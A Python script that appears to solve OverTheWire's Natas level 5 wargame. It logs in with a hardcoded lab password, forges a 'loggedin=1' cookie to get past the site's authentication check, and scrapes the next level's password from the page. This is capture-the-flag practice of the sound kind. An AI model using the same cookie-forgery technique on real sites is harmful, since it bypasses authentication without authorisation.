#!/usr/bin/env python3

import requests
import re

req = requests.Session()

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
url = "http://%s.natas.labs.overthewire.org" % username

req_get = req.get(url,auth=(username,password))
req.cookies.set("loggedin","1")
req_get = req.get(url,auth=(username,password))

# print(req_get.text)

nxt_pass = re.findall("The password for natas6 is (.*)</div>",req_get.text)
print(nxt_pass[0])